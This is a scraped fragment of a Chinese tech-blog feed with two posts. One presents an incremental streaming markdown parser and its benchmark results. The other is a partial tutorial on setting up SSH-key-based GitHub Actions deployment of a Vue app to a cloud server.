  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T02:57:48.000Z" title="Mon Dec 15 2025 02:57:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">故事的开始</h2>
<p>最初是想要实现富文本编辑器 ai 流式输出的，此过程大致为 <code>ai -&gt; chunk -&gt; parser -&gt; propsemirror JSONContent</code> 实现富文本编辑器中类似 ai 聊天框一样的流式输出，并且要尽量节省性能。</p>
<p>然后就出现了 <a href="https://link.juejin.cn?target=https%3A%2F%2Fincremark-docs.vercel.app%2F" target="_blank" title="https://incremark-docs.vercel.app/" ref="nofollow noopener noreferrer">incremark</a>，在此过程中也关注到了 <code>vue-stream-markdown</code>，不过它做的只是 vue 渲染层的优化，每次 ai 输出的 markdown chunk，它还是会将其跟之前所有输出拼接解析成 token，虽然在渲染层做到了流式的渲染，但其内核无法满足我的需求。</p>
<h2 data-id="heading-1">想法的实现</h2>
<p>在选择 markdown 底层解析器的时候关注了 tiptap 在用的 markedjs 以及之前自己实现 tiptap markdown 转换的 markdown-it，但最终还是选择了 remark 底层编辑器 micromark。因为 markdown-it token 结构的复杂度远高于 mdast 结构，它存在进入、退出的概念，但 mdast 就是一棵树。</p>
<p>因此拼接一棵树的复杂度其实是更低的，整个工具的设计思路为：</p>
<ol>
<li>维护一个文本缓冲区，接收流式输入</li>
<li>识别"稳定边界"（如空行、标题等），将已完成的块标记为 completed</li>
<li>对于正在接收的块，每次重新解析，但只解析该块的内容</li>
<li>复杂嵌套节点（如列表、引用）作为整体处理，直到确认完成</li>
</ol>
<p>最终可以将流式 markdown 的解析复杂度从 O(n²) 降低到 O(n)，ai 输出内容越多，性能节省也越多。</p>
<h2 data-id="heading-2">实际 benchmark 测试</h2>
<p>小型 markdown 解析性能可提高 2-10 倍，中型 markdown 解析性能提高 10-20 倍，长 markdown 解析性能提高 20-46 倍，当前更长的测试是没有必要的。</p>
<p>原始测试输出结果：</p>
<pre><code class="hljs language-plain" lang="plain">============================================================
Incremark Benchmark
============================================================
Markdown length: 771 chars
Chunk size: 10 chars
Total chunks: 78
Iterations: 100
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

📊 Traditional (re-parse all)
   Total time: 2608.41 ms
   Parse count: 7800
   Avg time per parse: 0.3344 ms
   Total chars parsed: 3,080,100

⚡ Incremark (incremental)
   Total time: 638.36 ms
   Parse count: 7800
   Avg time per parse: 0.0818 ms
   Total chars parsed: 77,100

------------------------------------------------------------

🎯 Performance Improvement:
   Time saved: 75.5%
   Chars parsing saved: 97.5%
   Speedup: 4.09x faster

============================================================

🔬 Running Incremark Benchmark Suite


============================================================
📄 Document Size: Short (~1KB) (1000 chars)
============================================================

📦 Chunk size: 10 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 1000 chars
Chunk size: 10 chars
Total chunks: 100
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

📊 Traditional (re-parse all)
   Total time: 435.85 ms
   Parse count: 2000
   Avg time per parse: 0.2179 ms
   Total chars parsed: 1,010,000

⚡ Incremark (incremental)
   Total time: 171.50 ms
   Parse count: 2000
   Avg time per parse: 0.0858 ms
   Total chars parsed: 20,000

------------------------------------------------------------

🎯 Performance Improvement:
   Time saved: 60.7%
   Chars parsing saved: 98.0%
   Speedup: 2.54x faster

============================================================

📦 Chunk size: 50 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 1000 chars
Chunk size: 50 chars
Total chunks: 20
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

📊 Traditional (re-parse all)
   Total time: 92.33 ms
   Parse count: 400
   Avg time per parse: 0.2308 ms
   Total chars parsed: 210,000

⚡ Incremark (incremental)
   Total time: 43.77 ms
   Parse count: 400
   Avg time per parse: 0.1094 ms
   Total chars parsed: 20,000

------------------------------------------------------------

🎯 Performance Improvement:
   Time saved: 52.6%
   Chars parsing saved: 90.5%
   Speedup: 2.11x faster

============================================================

============================================================
📄 Document Size: Medium (~5KB) (5000 chars)
============================================================

📦 Chunk size: 10 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 5000 chars
Chunk size: 10 chars
Total chunks: 500
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

📊 Traditional (re-parse all)
   Total time: 10335.94 ms
   Parse count: 10000
   Avg time per parse: 1.0336 ms
   Total chars parsed: 25,050,000

⚡ Incremark (incremental)
   Total time: 916.48 ms
   Parse count: 10000
   Avg time per parse: 0.0916 ms
   Total chars parsed: 100,000

------------------------------------------------------------

🎯 Performance Improvement:
   Time saved: 91.1%
   Chars parsing saved: 99.6%
   Speedup: 11.28x faster

============================================================

📦 Chunk size: 50 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 5000 chars
Chunk size: 50 chars
Total chunks: 100
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

📊 Traditional (re-parse all)
   Total time: 2120.47 ms
   Parse count: 2000
   Avg time per parse: 1.0602 ms
   Total chars parsed: 5,050,000

⚡ Incremark (incremental)
   Total time: 223.64 ms
   Parse count: 2000
   Avg time per parse: 0.1118 ms
   Total chars parsed: 100,000

------------------------------------------------------------

🎯 Performance Improvement:
   Time saved: 89.5%
   Chars parsing saved: 98.0%
   Speedup: 9.48x faster

============================================================

============================================================
📄 Document Size: Long (~10KB) (10000 chars)
============================================================

📦 Chunk size: 10 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 10000 chars
Chunk size: 10 chars
Total chunks: 1000
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

📊 Traditional (re-parse all)
   Total time: 40596.85 ms
   Parse count: 20000
   Avg time per parse: 2.0298 ms
   Total chars parsed: 100,100,000

⚡ Incremark (incremental)
   Total time: 1781.89 ms
   Parse count: 20000
   Avg time per parse: 0.0891 ms
   Total chars parsed: 200,000

------------------------------------------------------------

🎯 Performance Improvement:
   Time saved: 95.6%
   Chars parsing saved: 99.8%
   Speedup: 22.78x faster

============================================================

📦 Chunk size: 50 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 10000 chars
Chunk size: 50 chars
Total chunks: 200
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

📊 Traditional (re-parse all)
   Total time: 8095.40 ms
   Parse count: 4000
   Avg time per parse: 2.0239 ms
   Total chars parsed: 20,100,000

⚡ Incremark (incremental)
   Total time: 473.23 ms
   Parse count: 4000
   Avg time per parse: 0.1183 ms
   Total chars parsed: 200,000

------------------------------------------------------------

🎯 Performance Improvement:
   Time saved: 94.2%
   Chars parsing saved: 99.0%
   Speedup: 17.11x faster

============================================================

============================================================
📄 Document Size: Very Long (~20KB) (20000 chars)
============================================================

📦 Chunk size: 10 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 20000 chars
Chunk size: 10 chars
Total chunks: 2000
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

📊 Traditional (re-parse all)
   Total time: 183844.78 ms
   Parse count: 40000
   Avg time per parse: 4.5961 ms
   Total chars parsed: 400,200,000

⚡ Incremark (incremental)
   Total time: 3997.77 ms
   Parse count: 40000
   Avg time per parse: 0.0999 ms
   Total chars parsed: 400,000

------------------------------------------------------------

🎯 Performance Improvement:
   Time saved: 97.8%
   Chars parsing saved: 99.9%
   Speedup: 45.99x faster

============================================================

📦 Chunk size: 50 chars

============================================================
Incremark Benchmark
============================================================
Markdown length: 20000 chars
Chunk size: 50 chars
Total chunks: 400
Iterations: 20
============================================================

Warming up...

Running benchmark...

Results:
------------------------------------------------------------

📊 Traditional (re-parse all)
   Total time: 37400.52 ms
   Parse count: 8000
   Avg time per parse: 4.6751 ms
   Total chars parsed: 80,200,000

⚡ Incremark (incremental)
   Total time: 1001.10 ms
   Parse count: 8000
   Avg time per parse: 0.1251 ms
   Total chars parsed: 400,000

------------------------------------------------------------

🎯 Performance Improvement:
   Time saved: 97.3%
   Chars parsing saved: 99.5%
   Speedup: 37.36x faster

============================================================


================================================================================
📈 Complete Benchmark Summary
================================================================================

| Document Size    | Chunk | Time Saved | Chars Saved | Speedup |
|------------------|-------|------------|-------------|---------|
| Short (~1KB)     | 10    |      60.7% |       98.0% |   2.54x |
| Short (~1KB)     | 50    |      52.6% |       90.5% |   2.11x |
| Medium (~5KB)    | 10    |      91.1% |       99.6% |  11.28x |
| Medium (~5KB)    | 50    |      89.5% |       98.0% |   9.48x |
| Long (~10KB)     | 10    |      95.6% |       99.8% |  22.78x |
| Long (~10KB)     | 50    |      94.2% |       99.0% |  17.11x |
| Very Long (~20KB) | 10    |      97.8% |       99.9% |  45.99x |
| Very Long (~20KB) | 50    |      97.3% |       99.5% |  37.36x |

--------------------------------------------------------------------------------

📊 Average by Document Size:

   Short (~1KB): 2.33x faster, 56.7% time saved
   Medium (~5KB): 10.38x faster, 90.3% time saved
   Long (~10KB): 19.94x faster, 94.9% time saved
   Very Long (~20KB): 41.67x faster, 97.5% time saved

--------------------------------------------------------------------------------

🎯 Overall Average:
   Time Saved: 84.8%
   Chars Saved: 98.0%
   Speedup: 18.58x

================================================================================
</code></pre>
<h2 data-id="heading-3">框架支持</h2>
<p>由于从解析层面上实现了流式解析，并使用 mdast 进行解析结果的记录，因此当前工具很容易迁移到各种框架中，目前实现了 vue 与 react 版本，svelte 与 solid 等小众框架实现也很简单（但暂未做）。
vue demo 地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fincremark-vue.vercel.app%2F" target="_blank" title="https://incremark-vue.vercel.app/" ref="nofollow noopener noreferrer">incremark-vue.vercel.app/</a>
react demo 地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fincremark-react.vercel.app%2F" target="_blank" title="https://incremark-react.vercel.app/" ref="nofollow noopener noreferrer">incremark-react.vercel.app/</a></p>
<h2 data-id="heading-4">devtools</h2>
<p>除了功能实现，还增加了 devtools 可以查看当前解析内容的一些状态</p>
<p><strong>markdown 内容统计</strong>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/550853d582b04d6a90a110942dd29153~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAga2luZ-eOi-S4gOW4hQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766373055&amp;x-signature=FRy5uZPWQlKoR3DBkniTVayMfmA%3D" alt="image.png" loading="lazy"/></p>
<p><strong>markdown 块统计</strong>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/561b83774eee4072b67cdc23a5d6a4d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAga2luZ-eOi-S4gOW4hQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766373055&amp;x-signature=zFAmmBy2rh3%2BAAyCcXTRMnbZczA%3D" alt="image.png" loading="lazy"/></p>
<p><strong>mdast 结果</strong>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1be72d53785c47cead1a25813b4ba41c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAga2luZ-eOi-S4gOW4hQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766373055&amp;x-signature=EXLNo1qZUBsL1v4vWRfz2TpOgVM%3D" alt="image.png" loading="lazy"/></p>
<p><strong>chunk append 记录</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f478452aa88f4965b35bca6e59eaabea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAga2luZ-eOi-S4gOW4hQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766373055&amp;x-signature=AGkL2OutYLcw%2FvlpE7UKXbRKLh8%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-5">deepwiki 解析性能提升原因</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/237e2492d01243e8b542a83f3c5ba054~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAga2luZ-eOi-S4gOW4hQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766373055&amp;x-signature=X93lm6rRBGjpojEYbL9ojhVWaBE%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-6">小结</h2>
<p>欢迎大家体验，文档地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fincremark-docs.vercel.app%2Fzh%2F" target="_blank" title="https://incremark-docs.vercel.app/zh/" ref="nofollow noopener noreferrer">incremark-docs.vercel.app/zh/</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[全栈系列(15)github Actions自动化部署前端vue]]></title>    <link>https://juejin.cn/post/7583992239103180852</link>    <guid>https://juejin.cn/post/7583992239103180852</guid>    <pubDate>2025-12-16T06:13:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583992239103180852" data-draft-id="7583992239103000628" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="全栈系列(15)github Actions自动化部署前端vue "/> <meta itemprop="keywords" content="前端,GitHub,Node.js"/> <meta itemprop="datePublished" content="2025-12-16T06:13:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小胖霞"/> <meta itemprop="url" content="https://juejin.cn/user/3790771822016301"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            全栈系列(15)github Actions自动化部署前端vue 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3790771822016301/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小胖霞
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:13:08.000Z" title="Tue Dec 16 2025 06:13:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>很多国内开发者都会采用  <strong>“Gitee 做代码托管（速度快），GitHub 做自动化构建（功能强）”</strong>  的双仓库策略。</p>
<p>你不需“手动复制文件”，只需要利用 Git 的 <strong>多远程仓库（Multiple Remotes）</strong>  功能，就能在一个本地项目中同时管理两个仓库。</p>
<p>以下是实现这一方案的最佳实践步骤：</p>
<h4 data-id="heading-0">第一步：在 GitHub 上新建仓库</h4>
<ol>
<li>登录 GitHub，创建一个空仓库（假设叫 vue-admin-deploy）。</li>
<li><strong>不要</strong>勾选“Initialize this repository with a README”，我们需要一个纯空的仓库。</li>
</ol>
<h4 data-id="heading-1">第二步：添加 GitHub 为第二个远程仓库</h4>
<p>打开你的本地项目终端，执行以下命令：</p>
<pre><code class="hljs language-js" lang="js"># <span class="hljs-number">1.</span> 查看当前的远程仓库（应该只有 gitee）
git remote -v
# 输出通常是：origin  <span class="hljs-attr">https</span>:<span class="hljs-comment">//gitee.com/你的用户名/项目名.git (fetch/push)</span>

# <span class="hljs-number">2.</span> 添加 <span class="hljs-title class_">GitHub</span> 为第二个远程仓库，命名为 <span class="hljs-string">"github"</span>
git remote add github <span class="hljs-attr">https</span>:<span class="hljs-comment">//github.com/你的用户名/vue-admin-deploy.git</span>

# <span class="hljs-number">3.</span> 再次查看
git remote -v
# 现在应该有 origin (<span class="hljs-title class_">Gitee</span>) 和 github (<span class="hljs-title class_">GitHub</span>) 两个了


</code></pre>
<h4 data-id="heading-2">生成私钥和公钥</h4>
<p>请完全照做一遍，不要跳过任何步骤：</p>
<h5 data-id="heading-3">第一步：在本地电脑生成新密钥（PEM格式）</h5>
<p>打开你的终端（Git Bash 或 CMD），执行这条命令生成一对新钥匙：</p>
<pre><code class="hljs language-js" lang="js"># -m <span class="hljs-variable constant_">PEM</span> 是关键！强制生成旧版兼容格式，防止 <span class="hljs-title class_">Action</span> 不识别
# -f gh_action_key 指定文件名
# -N <span class="hljs-string">""</span> 设置空密码（必须为空）
ssh-keygen -t rsa -b <span class="hljs-number">4096</span> -m <span class="hljs-variable constant_">PEM</span> -f gh_action_key -N <span class="hljs-string">""</span>
</code></pre>
<p>执行后，你的当前目录下会有两个文件：</p>
<ol>
<li>gh_action_key (私钥，没后缀)</li>
<li>gh_action_key.pub (公钥)</li>
</ol>
<h5 data-id="heading-4">第二步：把公钥放到阿里云服务器</h5>
<ol>
<li><strong>复制公钥内容</strong>：打开 gh_action_key.pub，复制里面的全部内容。</li>
<li><strong>登录服务器</strong>：使用 SSH 登录你的阿里云服务器。</li>
<li>写入文件：执行以下命令（假设你是用 root 用户部署，如果是其他用户，请切换到对应用户）</li>
<li/>
</ol>
<pre><code class="hljs language-js" lang="js"># 进入 ssh 目录
cd ~/.<span class="hljs-property">ssh</span>

# 把公钥追加到授权文件中（注意是 &gt;&gt; 也就是追加）
# 按 i 进入编辑模式，粘贴内容，按 <span class="hljs-title class_">Esc</span>，输入 :wq 保存
vi authorized_keys
# 或者直接用命令追加（把下面双引号里的内容换成你刚才复制的公钥）
echo <span class="hljs-string">"ssh-rsa AAAAB3NzaC1yc2E..."</span> &gt;&gt; authorized_keys
</code></pre>
<p><strong>修复权限（至关重要！！！）</strong><br/>
权限不对，SSH 会直接拒绝登录，不管密钥对不对。请在服务器执行</p>
<pre><code class="hljs language-js" lang="js">chmod <span class="hljs-number">700</span> ~/.<span class="hljs-property">ssh</span>
chmod <span class="hljs-number">600</span> ~<span class="hljs-regexp">/.ssh/</span>authorized_keys
</code></pre>
<h5 data-id="heading-5">第三步：把私钥放到 GitHub Secrets</h5>
<h4 data-id="heading-6">密钥准备 (Secrets)</h4>
<p>为了安全，不要将服务器 IP 和私钥明文写在代码里。在 GitHub 仓库的 <strong>Settings -&gt; Secrets and variables -&gt; Actions</strong> 中添加：</p>
<ul>
<li>SERVER_IP: 服务器公网 IP。</li>
<li>SERVER_USER: 登录用户名 (如 root)。</li>
<li>SERVER_SSH_KEY: SSH 私钥。</li>
</ul>
<ol>
<li>
<p><strong>复制私钥内容</strong>：在本地打开 gh_action_key（那个没后缀的文件）。</p>
</li>
<li>
<p><strong>全选复制</strong>：必须包含 <code>-----BEGIN RSA PRIVATE KEY----- 和 -----END RSA PRIVATE KEY-----</code>。</p>
</li>
<li>
<p><strong>去 GitHub</strong>：<code>Settings -&gt; Secrets and variables -&gt; Actions</code>。</p>
</li>
<li>
<p><strong>更新 Secret</strong>： 去 GitHub 仓库页面 -&gt; <strong>Settings</strong> -&gt; <strong>Secrets and variables</strong> -&gt; <strong>Actions</strong>。</p>
</li>
<li>
<p>添加 SERVER_IP, SERVER_USER, SERVER_SSH_KEY。</p>
</li>
<li>
